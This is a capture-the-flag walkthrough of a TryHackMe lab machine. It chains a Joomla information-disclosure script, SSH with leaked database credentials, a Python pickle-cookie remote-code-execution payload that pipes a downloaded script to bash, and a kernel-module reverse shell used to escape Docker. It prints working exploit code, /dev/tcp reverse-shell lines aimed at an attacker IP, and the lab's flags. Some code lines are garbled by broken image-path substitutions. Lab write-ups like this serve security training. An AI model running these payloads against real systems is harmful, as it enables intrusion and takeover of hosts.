
# PORT SCAN
---


| PORT | SERVICE |
| :--- | :------ |
| 22   | SSH     |
| 80   | HTTP    |
| 2222 | SSH     |


# RECONNAISSANCE
---

We got two `ssh` open ports, pretty weird, let's proceed to the web application, based on the port scan, we notice we're able to access `robots.txt`:

![Pasted image 20250902170752.png](../../IMAGES/Pasted%20image%2020250902170752.png)

We find some interesting stuff on here, let's check it up:

![Pasted image 20250902170755.png](../../IMAGES/Pasted%20image%2020250902170755.png)

We're dealing with a `joomla` installation, we can confirm this with `whatweb` or `wappalyzer`, by reading joomla's documentation, we notice we can find more info on the installation such as the version by going into the following route:

```
http://target/administrator/manifests/files/joomla.xml
```

If we go to the path, we find the version:

![Pasted image 20250902170801.png](../../IMAGES/Pasted%20image%2020250902170801.png)

We're dealing with `joomla 4.2.7`, if we search for vulnerabilities regarding this version, we find this one:

![Pasted image 20250902170806.png](../../IMAGES/Pasted%20image%2020250902170806.png)

We can search for a PoC script in order to exploit this, let's begin exploitation.


# EXPLOITATION
---

This is an information disclosure vulnerability, we can use the following PoC to test this, I took a script from GitHub and changed it a little bit for you:

```sh
#!/bin/bash

# Exploit: Joomla! v4.2.8 - Unauthenticated Information Disclosure
# Target: http://voyage.thm

BASE_URL="http://voyage.thm"

# Colors
RED="\e[31m"
GREEN="\e[32m"
CYAN="\e[36m"
YELLOW="\e[33m"
RESET="\e[0m"

banner() {
    echo -e "${CYAN}"
    echo "==============================================="
    echo "   Joomla! v4.2.8 - Info Disclosure Exploit"
    echo "   Target: ${BASE_URL}"
    echo "==============================================="
    echo -e "${RESET}"
}

fetch_users() {
    echo -e "${YELLOW}[+] Fetching users...${RESET}"
    curl -s "$BASE_URL/api/index.php/v1/users?public=true" | \
    jq -r '.data[] 
        | select(.type == "users") 
        | "ID: \(.attributes.id)\nName: \(.attributes.name)\nUsername: \(.attributes.username)\nEmail: \(.attributes.email)\nGroups: \(.attributes.group_names)\n---"'
}

fetch_config() {
    echo -e "${YELLOW}[+] Fetching config...${RESET}"
    curl -s "$BASE_URL/api/index.php/v1/config/application?public=true" | \
    jq -r '.data[] 
        | select(.type == "application") 
        | to_entries[] 
        | "\(.key): \(.value)"'
}

# Run
banner
fetch_users
echo
fetch_config
```

Once we run it, we get this output:

```bash
===============================================
   Joomla! v4.2.8 - Info Disclosure Exploit
   Target: http://voyage.thm
===============================================

[+] Fetching users...
ID: 377
Name: root
Username: root
Email: mail@tourism.thm
Groups: Super Users
---

[+] Fetching config...
type: application
id: 224
attributes: {"offline":false,"id":224}
type: application
id: 224
attributes: {"offline_message":"This site is down for maintenance.<br>Please check back again soon.","id":224}
type: application
id: 224
attributes: {"display_offline_message":1,"id":224}
type: application
id: 224
attributes: {"offline_image":"","id":224}
type: application
id: 224
attributes: {"sitename":"Tourism","id":224}
type: application
id: 224
attributes: {"editor":"tinymce","id":224}
type: application
id: 224
attributes: {"captcha":"0","id":224}
type: application
id: 224
attributes: {"list_limit":20,"id":224}
type: application
id: 224
attributes: {"access":1,"id":224}
type: application
id: 224
attributes: {"debug":false,"id":224}
type: application
id: 224
attributes: {"debug_lang":false,"id":224}
type: application
id: 224
attributes: {"debug_lang_const":true,"id":224}
type: application
id: 224
attributes: {"dbtype":"mysqli","id":224}
type: application
id: 224
attributes: {"host":"localhost","id":224}
type: application
id: 224
attributes: {"user":"root","id":224}
type: application
id: 224
attributes: {"password":"RootPassword@1234","id":224}
type: application
id: 224
attributes: {"db":"joomla_db","id":224}
type: application
id: 224
attributes: {"dbprefix":"ecsjh_","id":224}
type: application
id: 224
attributes: {"dbencryption":0,"id":224}
type: application
id: 224
attributes: {"dbsslverifyservercert":false,"id":224}
```

As noticeable, we're able to find some credentials:

```
attributes: {"user":"root","id":224}
type: application
id: 224
attributes: {"password":"RootPassword@1234","id":224}
```

We got:

```
root / RootPassword@1234
```

Testing these credentials at ssh on port 22, we get this:

![Pasted image 20250902170821.png](../../IMAGES/Pasted%20image%2020250902170821.png)

We get an error, this port only accepts a private and public key, what about the one on port `2222`:

![Pasted image 20250902170825.png](../../IMAGES/Pasted%20image%2020250902170825.png)

We got access as root, we're inside of a container, we're able to notice this due to:

```
root@f5eb774507f2
```

We can also check this by finding `.dockerenv` inside of `/`, let's use a specific script for `docker container` enumeration such as [deepce](https://github.com/stealthcopter/deepce/blob/main/deepce.sh), in case it fails, we can simply use linpeas, let's begin privilege escalation then.

# PRIVILEGE ESCALATION
---

If we use deepce, we get the following output:

![Pasted image 20250902170830.png](../../IMAGES/Pasted%20image%2020250902170830.png)

We notice a nmap scan was done and it found this:

```
[+] Scanning host 192.168.100.1 (nmap) Starting Nmap 7.80 ( https://nmap.org ) at 2025-09-02 19:51 UTC
Nmap scan report for ip-192-168-100-1.ec2.internal (192.168.100.1)
Host is up (0.0000050s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2222/tcp open  EtherNetIP-1
5000/tcp open  upnp
```

We found another open port inside of the local machine, the part we're really interested in, is the other internal network found by the deepce output:

```
[+] Attempting ping sweep of 192.168.100.0/24 (nmap) 
Host: 192.168.100.1 (ip-192-168-100-1.ec2.internal)	Status: Up
Host: 192.168.100.12 (voyage_priv2.joomla-net)	Status: Up
Host: 192.168.100.10 (f5eb774507f2)	Status: Up
```

We found:

```
192.168.100.12
```

Let's run nmap on it:

```
root@f5eb774507f2:/tmp# nmap -p- -T4 -sV 192.168.100.12 -Pn
Starting Nmap 7.80 ( https://nmap.org ) at 2025-09-02 19:58 UTC
Nmap scan report for voyage_priv2.joomla-net (192.168.100.12)
Host is up (0.0000050s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE VERSION
5000/tcp open  upnp?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.80%I=7%D=9/2%Time=68B74C54%P=x86_64-pc-linux-gnu%r(Get
SF:Request,846,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.1\.3\x20P
SF:ython/3\.10\.12\r\nDate:\x20Tue,\x2002\x20Sep\x202025\x2019:58:12\x20GM
SF:T\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2
SF:01942\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=
SF:\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x20\
SF:x20\x20<title>Tourism\x20Secret\x20Finance\x20Panel</title>\n\x20\x20\x
SF:20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\
SF:.css\">\n</head>\n<body\x20style=\"background:\x20linear-gradient\(135d
SF:eg,\x20#e0f7fa,\x20#80deea\);\x20min-height:\x20100vh;\">\n\x20\x20\x20
SF:\x20<!--\x20Navbar\x20-->\n\x20\x20\x20\x20<nav\x20class=\"navbar\x20na
SF:vbar-expand-lg\x20navbar-dark\x20bg-dark\">\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20<div\x20class=\"container-fluid\">\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20<a\x20class=\"navbar-brand\"\x20href=\"#\">\xf0\x9f\
SF:x94\x90\x20Secret\x20Panel</a>\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20<div\x20class=\"collapse\x20navbar-collapse\">\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<ul\x20class=\"navbar
SF:-nav\x20ms-auto\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20<li\x20class=\"nav-item\">\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20<a\x20class=\"nav-link\x20active\"\x20href=\"#\">Login\x20\(
SF:Under\x20Dev\)</a>\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20</li>\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C/
SF:/DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x20\x20\"http://w
SF:ww\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x20\x20<head>\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20c
SF:ontent=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<t
SF:itle>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x
SF:20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20version\x20\('RT
SF:SP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20e
SF:xplanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20request\x20syntax
SF:\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>
SF:\n");
MAC Address: 02:42:C0:A8:64:0C (Unknown)
```

This is a `Werkzeug/Flask app`, let's use ssh tunneling to forward the page and visualize it:

```
ssh -L 5000:192.168.100.12:5000 root@voyage.thm -p 2222
```

Once we forward the port, we find this:

![Pasted image 20250902170840.png](../../IMAGES/Pasted%20image%2020250902170840.png)

We're able to log in using the same credentials as ssh:

```
root / RootPassword@1234
```

![Pasted image 20250902170859.png](../../IMAGES/Pasted%20image%2020250902170859.png)

We get access to that panel but we can't do anything on it, let's fuzz the page and check if anything can be found:

```
dirsearch -u http://127.0.0.1:5000 \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-e php,txt,xml,html,zip,bak \
-t 100 -r --deep-recursive
```

We find this:

![Pasted image 20250902170923.png](../../IMAGES/Pasted%20image%2020250902170923.png)

We got `/console`, let's check it up:

![Pasted image 20250902170926.png](../../IMAGES/Pasted%20image%2020250902170926.png)

We need a PIN in order to access the console, in order to craft the PIN, we need the machine id and the MAC-Derived node id so, this isn't our way to go, going back to the panel and firing up burp, we notice the cookie looks weird:

![Pasted image 20250902171000.png](../../IMAGES/Pasted%20image%2020250902171000.png)

We got this cookie:

```
Cookie: session_data=80049525000000000000007d94288c0475736572948c04726f6f74948c07726576656e7565948c05383530303094752e
```

The cookie starts with `8004...`, that's a python pickle header `(\x80\x04)`, what follows the cookie seems to be consistent with pickled objects, based on that, we could conclude the cookie is a serialized python object using `pickle`, using pickle for session cookies is highly unsafe because it can allow to RCE when deserialized, if the app loads the cookie directly using (`pickle.loads(cookie)`), we could be dealing with `Python Pickle Deserialization RCE`, you can read some articles about it here:

https://github.com/erdogant/pypickle/issues/2

https://medium.com/@rizqimulkisrc/python-security-pickle-deserialization-and-remote-code-execution-6561781e1efa

https://www.vicarius.io/vsociety/posts/rce-in-python-nltk-cve-2024-39705-39706


Let's begin our RCE, for example, we can decode the cookie to confirm its a pickle:

```python
import pickle
import binascii

cookie = "80049525000000000000007d94288c0475736572948c04726f6f74948c07726576656e7565948c05383530303094752e"

data = pickle.loads(binascii.unhexlify(cookie))
print(data)
```

Once we run the script, we get this:

```python
python3 decode.py
{'user': 'root', 'revenue': '85000'}
```

So yeah, we're definitely dealing with pickle, let's craft another python script to test simple RCE by trying to fetch a resource from a python server we host using curl, we can use this:

```python
import pickle
import binascii
import requests
import os
import sys
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# -----------------------------
# Step 1: Build a malicious object
# -----------------------------
class RCE:
    def __reduce__(self):
        # Change this to your callback listener
        cmd = "curl http://YOUR_IP:8000/pwned"
        return (os.system, (cmd,))

def build_payload():
    payload = binascii.hexlify(../../IMAGES/Pickle.dumps(RCE())).decode()
    print(Fore.CYAN + "[*] " + Style.RESET_ALL + "Generated malicious payload:")
    print(Fore.YELLOW + payload + Style.RESET_ALL)
    return payload

# -----------------------------
# Step 2: Send POST request with crafted cookie
# -----------------------------
def send_payload(../../IMAGES/Payload, url="http://localhost:5000/"):
    cookies = {"session_data": payload}
    print(Fore.CYAN + f"[*] Sending payload to {url}..." + Style.RESET_ALL)

    try:
        r = requests.post(url, cookies=cookies, timeout=10)
        print(Fore.GREEN + "[+] " + Style.RESET_ALL + f"Response code: {r.status_code}")
        print(Fore.MAGENTA + "[>] " + Style.RESET_ALL + "Response snippet:\n")
        print(r.text[:500] + ("..." if len(r.text) > 500 else ""))
    except Exception as e:
        print(Fore.RED + "[-] " + Style.RESET_ALL + f"Request failed: {e}")

# -----------------------------
# Main Execution
# -----------------------------
if __name__ == "__main__":
    print(Fore.BLUE + Style.BRIGHT + "\n=== Pickle RCE Test Script ===\n" + Style.RESET_ALL)

    payload = build_payload()
    send_payload(../../IMAGES/Payload)

    print(Fore.BLUE + Style.BRIGHT + "\n[!] Done. Check your listener/logs for a callback.\n" + Style.RESET_ALL)
```

Set up a python server and run the script, once it runs, you will notice this:

![Pasted image 20250902171009.png](../../IMAGES/Pasted%20image%2020250902171009.png)

The call to our server actually gets made, we got RCE, let's now create a simple script containing a reverse shell and change the script so it executes our reverse shell once it gets downloaded with curl:

```
#!/bin/bash
bash -i >& /dev/tcp/IP/4444 0>&1
```

Save that as `revshell.sh` and use:

```python
import pickle
import binascii
import requests
import os
from termcolor import colored

# -----------------------------
# Step 1: Build a malicious object
# -----------------------------
class RCE:
    def __reduce__(self):
        # Change this to point to your hosted shell script
        cmd = "curl http://10.14.21.28:8000/revshell.sh | bash"
        return (os.system, (cmd,))

# Serialize & hex-encode
payload = binascii.hexlify(../../IMAGES/Pickle.dumps(RCE())).decode()
print(colored("[+] Malicious payload generated!", "green"))
print(colored(../../IMAGES/Payload, "yellow"))

# -----------------------------
# Step 2: Send POST request with cookie
# -----------------------------
url = "http://localhost:5000/"   # Change to your target URL
cookies = {'session_data': payload}

try:
    r = requests.post(url, cookies=cookies)
    print(colored("[+] Response status code:", "cyan"), r.status_code)
    print(colored("[+] Response snippet:", "cyan"), r.text[:500])
except Exception as e:
    print(colored("[-] Request failed: ", "red"), e)
```

Before running that, host a python server and set up a listener back on the specified port on the revshell, I'll use `penelope`:

![Pasted image 20250902171015.png](../../IMAGES/Pasted%20image%2020250902171015.png)

![Pasted image 20250902171024.png](../../IMAGES/Pasted%20image%2020250902171024.png)

![Pasted image 20250902171033.png](../../IMAGES/Pasted%20image%2020250902171033.png)

Checking our listener, we notice we got a shell as root but inside of another container again, if you're using [penelope](https://github.com/brightio/penelope), you can upload the privesc scripts with ease by doing:

```
cd /tmp

F12

run upload_privesc_scripts
```

Let's use `deepce` once again:

![Pasted image 20250902171039.png](../../IMAGES/Pasted%20image%2020250902171039.png)

We got these capabilities:

```
[+] Dangerous Capabilities .. Yes
Current: cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Current IAB: !cap_dac_read_search,!cap_linux_immutable,!cap_net_broadcast,!cap_net_admin,!cap_ipc_lock,!cap_ipc_owner,!cap_sys_rawio,!cap_sys_ptrace,!cap_sys_pacct,!cap_sys_admin,!cap_sys_boot,!cap_sys_nice,!cap_sys_resource,!cap_sys_time,!cap_sys_tty_config,!cap_lease,!cap_audit_control,!cap_mac_override,!cap_mac_admin,!cap_syslog,!cap_wake_alarm,!cap_block_suspend,!cap_audit_read,!cap_perfmon,!cap_bpf,!cap_checkpoint_restore
```

Checking the output, we notice this capability:

```
cap_sys_module
```

Deepce allow us to exploit this feature:

```
root@d221f7bc7bf8:/tmp# ./deepce.sh -h
Usage: deepce.sh [OPTIONS...]

  -ne,--no-enum          Don't perform enumeration, useful for skipping straight to exploits
  -nn,--no-network       Don't perform any network operations
  -nc,--no-colors        Don't use terminal colors

  --install              Install useful packages before running script, this will maximise enumeration and exploitation potential

  -doc, --delete         Script will delete itself on completion

  [Exploits]
  -e, --exploit          Use one of the following exploits (eg. -e SOCK)

    DOCKER               use docker command to create new contains and mount root partition to priv esc
    PRIVILEGED           exploit a container with privileged mode to run commands on the host
    SOCK                 use an exposed docker sock to create a new container and mount root partition to priv esc
    CVE-2019-5746
    CVE-2019-5021
    SYS_MODULE           Exploit the SYS_MODULE privilege to create a malicious kernel module and obtain root on the host

  [Payloads & Options]
  -i, --ip               The local host IP address for reverse shells to connect to
  -p, --port             The port to use for bind or reverse shells
  -l, --listen           Automatically create the reverse shell listener

  -s, --shadow           Print the shadow file as the payload

  -cmd, --command        Run a custom command as the payload

  -x, --payload          Run a custom executable as the payload

  --username             Create a new root user
  --password             Password for new root user

  [General Options]
  -q, --quiet            Shhhh, be less verbose
  -h, --help             Display this help and exit.

  [Examples]
  # Exploit docker to get a local shell as root
  ./deepce.sh -e DOCKER

  # Exploit an exposed docker sock to get a reverse shell as root on the host
  ./deepce.sh -e SOCK -l -i 192.168.0.23 -p 4444
```

If we use the feature, we notice we're unable to exploit it since we're missing the headers:

![Pasted image 20250902171057.png](../../IMAGES/Pasted%20image%2020250902171057.png)

Let's do the process ourselves then, you can check some articles here:

https://redfoxsecurity.medium.com/exploiting-linux-capabilities-cap-sys-module-055cac48caab

https://redfoxsec.com/blog/exploiting-linux-capabilities-capsysmodule-exploits/

https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html

![Pasted image 20250902171112.png](../../IMAGES/Pasted%20image%2020250902171112.png)

![Pasted image 20250902171116.png](../../IMAGES/Pasted%20image%2020250902171116.png)

Let's begin, first of all, create a `Makefile` with this content:

```c
obj-m += reverse-shell.o

all:
	make -C /lib/modules/6.8.0-1030-aws/build M=$(../../IMAGES/PWD) modules

clean:
	make -C /lib/modules/6.8.0-1030-aws/build M=$(../../IMAGES/PWD) clean
```

Now, we need to create a `reverse-shell.c` file with this:

```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.14.21.28/9001 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

Now, set up a listener on the specified port, in this case I used `9001`, then do:

```
make
```

![Pasted image 20250902171122.png](../../IMAGES/Pasted%20image%2020250902171122.png)

We got `reverse-shell.ko`, we need to run it in order to catch our shell:

```
insmod reverse-shell.ko
```

![Pasted image 20250902171127.png](../../IMAGES/Pasted%20image%2020250902171127.png)

![Pasted image 20250902171131.png](../../IMAGES/Pasted%20image%2020250902171131.png)

We got a root shell inside `tryhackme-2404` breaking out of all docker containers, let's read both flags and end the CTF:

```
root@tryhackme-2404:/# find / -type f -name "user.txt" 2>/dev/null
/var/lib/docker/overlay2/0cf59b3bba7f1ba76d3d2da382839548fdedc643f6015fa04157e0948e12d02d/merged/root/user.txt
```

```
root@tryhackme-2404:/# cat /var/lib/docker/overlay2/0cf59b3bba7f1ba76d3d2da382839548fdedc643f6015fa04157e0948e12d02d/merged/root/user.txt
THM{ee346612fb944085af0dd2cd677b1902}

root@tryhackme-2404:/# cat /root/root.txt
THM{ace91ec899f84498a74629b078bdceff}
```

![Pasted image 20250902171137.png](../../IMAGES/Pasted%20image%2020250902171137.png)

